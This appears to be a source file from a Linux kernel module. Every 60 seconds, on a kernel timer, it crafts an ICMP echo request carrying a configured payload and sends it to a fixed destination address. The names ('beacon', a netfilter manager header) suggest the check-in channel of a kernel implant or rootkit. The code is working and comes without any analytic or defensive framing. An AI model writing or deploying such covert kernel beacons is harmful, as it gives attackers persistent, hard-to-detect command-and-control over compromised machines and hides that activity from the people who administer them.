#include "../include/beacon.h"
#include "../include/netfilter_manager.h"
#include "../include/config.h"

static struct timer_list beacon_timer;

static void send_icmp_ping(struct net *net,
                            __be32 dest_ip,
                            __be32 src_ip,
                            __u16 id,
                            __u16 sequence,
                            unsigned char *payload_data,
                            size_t payload_len)
{
    struct sk_buff *nskb;
    struct iphdr *nip;
    struct icmphdr *nicmp;
    unsigned char *payload;
    unsigned int total_len;
    struct flowi4 fl4;
    struct rtable *rt;

    total_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_len;

    /* Look up route to destination */
    memset(&fl4, 0, sizeof(fl4));
    fl4.daddr        = dest_ip;
    fl4.saddr        = src_ip;
    fl4.flowi4_proto = IPPROTO_ICMP;

    rt = ip_route_output_key(net, &fl4);
    if (IS_ERR(rt)) {
        printk(KERN_ERR "ICMP ping: route lookup failed\n");
        return;
    }

    /* Use route's source IP if not specified */
    if (!src_ip)
        src_ip = fl4.saddr;

    /* Allocate new skb */
    nskb = alloc_skb(LL_MAX_HEADER + total_len, GFP_ATOMIC);
    if (!nskb) {
        ip_rt_put(rt);
        return;
    }

    skb_reserve(nskb, LL_MAX_HEADER);
    skb_reset_network_header(nskb);

    /* Build IP header */
    nip = skb_put(nskb, sizeof(struct iphdr));
    nip->version  = 4;
    nip->ihl      = 5;
    nip->tos      = 0;
    nip->tot_len  = htons(total_len);
    nip->id       = htons((__u16)get_random_u64());
    nip->frag_off = 0;
    nip->ttl      = 64;
    nip->protocol = IPPROTO_ICMP;
    nip->saddr    = src_ip;
    nip->daddr    = dest_ip;
    nip->check    = 0;
    nip->check    = ip_fast_csum((unsigned char *)nip, nip->ihl);

    /* Build ICMP echo request header */
    skb_set_transport_header(nskb, sizeof(struct iphdr));
    nicmp = skb_put(nskb, sizeof(struct icmphdr));
    nicmp->type             = ICMP_ECHO;  /* Type 8 = Echo Request */
    nicmp->code             = 0;
    nicmp->un.echo.id       = htons(id);
    nicmp->un.echo.sequence = htons(sequence);
    nicmp->checksum         = 0;

    /* Add payload */
    if (payload_len > 0) {
        payload = skb_put(nskb, payload_len);
        memcpy(payload, payload_data, payload_len);
    }

    /* Calculate ICMP checksum */
    nicmp->checksum = csum_fold(
        csum_partial((unsigned char *)nicmp,
                    sizeof(struct icmphdr) + payload_len, 0));

    /* Attach route and send */
    nskb->protocol = htons(ETH_P_IP);
    skb_dst_set(nskb, &rt->dst);

    ip_local_out(net, NULL, nskb);
}

/* called when timer fires */
static void timer_callback(struct timer_list *t)
{
    send_icmp_ping(&init_net, in_aton(BEACON_DEST_IP), 0, BEACON_ID, BEACON_SEQ, (unsigned char *)BEACON_PAYLOAD, strlen(BEACON_PAYLOAD));

    /* re-arm for another 60 seconds */
    mod_timer(t, jiffies + msecs_to_jiffies(BEACON_PERIOD_MS));
}

void beacon_start(void)
{
    timer_setup(&beacon_timer, timer_callback, 0);
    mod_timer(&beacon_timer, jiffies + msecs_to_jiffies(BEACON_PERIOD_MS));
}

void beacon_stop(void)
{
    del_timer_sync(&beacon_timer);
}